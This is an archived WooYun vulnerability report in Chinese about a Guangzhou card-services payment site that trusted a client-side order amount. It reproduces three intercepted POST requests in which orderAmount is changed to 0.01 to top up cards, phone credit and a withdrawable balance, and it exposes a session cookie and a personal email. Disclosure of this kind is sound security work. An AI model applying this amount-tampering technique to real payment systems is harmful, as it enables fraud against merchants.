{"id": 65815, "wybug_id": "wooyun-2015-0136459", "wybug_title": "广州某一卡通中心一分钱充饭卡充话费等业务且可无限额提现（测试成功）", "wybug_corp": "广州某一卡通中心", "wybug_author": "hyge", "wybug_date": "2015-08-24 16:45", "wybug_open_date": "2015-10-11 17:14", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(广东省信息安全测评中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏校验", "认证设计不合理", "支付行业敏感"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-11：\t细节向公众公开  简要描述： 打开衣橱，发现无衣可穿，尴尬的笑，幸亏身材尚好，混搭也可。 详细说明：  点开支付宝，发现无余额可充值，尴尬的笑，幸亏技术够diao，一分充值也可。通过检测发现，在订单实时付款功能存在严重的业务漏洞，实时付款时订单金额在请求第三方支付接口（如支付宝）支付时未设置有效的金额防篡改机制，导致攻击者在请求第三方支付接口时订单金额可被任意篡改，如100元业务金额在请求第三方支付接口时可改成0.01元进行支付。并且在第三方支付完成了实际支付后也存在严重的业务问题，电商订单系统只认证其是否支付成功，没有再次校验实际支付金额就返回支付成功。攻击者可通过该漏洞在订单支付时，可用0.01元办任何有需要支付的业务，甚至可存在攻击者利用这一漏洞，在支付成功后可通过提现流程进行恶意套现。昨晚看到食堂的饭菜不和胃口，点了10元的葱油拌面，刷卡时发现余额不足，掏出荷包，已是囊中羞涩，找同学借了饭卡刷了吃完回来就充卡，我怕下次找不到人借卡就尴尬。出去吃饭的时候Fiddler没关，结果。。下面详细说明一卡通充值：提交卡号、姓名、金额\n\n生成订单\n\n就在付款的一瞬间，我截取了数据包\nPOST https://www.gzekt.com/payServlet HTTP/1.1Host: www.gzekt.comConnection: keep-aliveContent-Length: 143Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: https://www.gzekt.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2369.0 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: https://www.gzekt.com/PayAction_payOrder.action?orderids=20150824100011000005Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: JSESSIONID=DE67C1DE857AF90701A0411E026AC4EF; username=gehuiyun407%40163.com; checked=checkedorderNumber=20150824100011000005&busicode=100011&orderAmount=100.0&payusername=gehuiyun407%40163.com&payaccno=100101303558&iAccType=4&payType=3\n轻轻的我就把orderAmount=100.0改为了0.01千山万水总是情，我给你一分行不行\n\n好像行\n\n还真行\n\n大学城一卡通充值完后，还得到补助领取机去圈存领取。后来我领取成功了。。手机话费充值：提交手机号和面额\n\n生成订单\n\n我轻轻地把数据包拦、\nPOST https://www.gzekt.com/payServlet HTTP/1.1Host: www.gzekt.comConnection: keep-aliveContent-Length: 142Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: https://www.gzekt.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2369.0 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: https://www.gzekt.com/PayAction_updateOrderCust.actionAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: JSESSIONID=DE67C1DE857AF90701A0411E026AC4EF; username=gehuiyun407%40163.com; checked=checkedorderNumber=20150824100027000005&busicode=100027&orderAmount=98.0&payusername=gehuiyun407%40163.com&payaccno=100101303558&iAccType=4&payType=3\n轻轻的修改了它的价格。千山万水总是情。。。\n\n行。。\n\n哇哦。。。又成功了。\n\n没有短信提醒。我打电话给坑爹的移动大婶。。账户确实多了100...我的汇银通 充值 这个充值后可提现同样的道理。。。提交充值金额\n\n生成订单\n\n我轻轻地轻轻地。。。\nPOST https://www.gzekt.com/payServlet HTTP/1.1Host: www.gzekt.comConnection: keep-aliveContent-Length: 143Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: https://www.gzekt.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2369.0 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: https://www.gzekt.com/PayAction_payOrder.action?orderids=20150824100001000014Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: JSESSIONID=DE67C1DE857AF90701A0411E026AC4EF; username=gehuiyun407%40163.com; checked=checkedorderNumber=20150824100001000014&busicode=100001&orderAmount=100.0&payusername=gehuiyun407%40163.com&payaccno=100101303558&iAccType=1&payType=3\n轻轻的修改了它的价格千山万水总是情、、、\n\n有木有。\n\n有了。\n\n完了之后，还有个提现功能，没有绑定银行卡，我就不去弄了。。。。左侧栏的各种服务，都可以一分钱服务。看到驾校报名，可惜我拿到本本好几年。。。\n\n\n\n   漏洞证明：  就这样，不多说了。还要什么漏洞证明。没有经过安全评估就上线运营。太多漏洞了、这个算是最最严重的、严重的影响了资金安全、、日子本就过得拮据，学费还没凑到、我怕我心生邪念，也为了防止被土不人利用了此漏洞。我就罪过大了。赶紧把漏洞交给国家。。   修复方案：  修复这么简单，还要我说么。。。   版权声明：转载请注明来源 hyge@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-08-27 17:13 厂商回复： 非常感谢您的报告。报告中的问题已确认并复现.影响的数据：高攻击成本：低造成影响：高综合评级为：高，rank：15正在联系相关网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-24 16:55 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:399 漏洞数:87        | 什么狗屁爱，生活已乱套！人的一生中，...)\t\t \n  膜拜免费吃喝的神兽    \n     2015-08-24 17:33 |    \t\tMieless \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:1        | 我是来打酱油的。)\t\t \n  如此惠民工程竟然被举报    \n     2015-09-16 21:02 |    \t\tfox \t\t\t( 普通白帽子  |\t\t\t        Rank:159 漏洞数:16        | fox)\t\t \n  洞主你邮箱漏点了    \n     2015-09-18 16:24 |    \t\thyge \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:1        | cubesec)\t\t \n  @fox 完了~要被社工了。当初我修改过的乌云没有给我更新。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}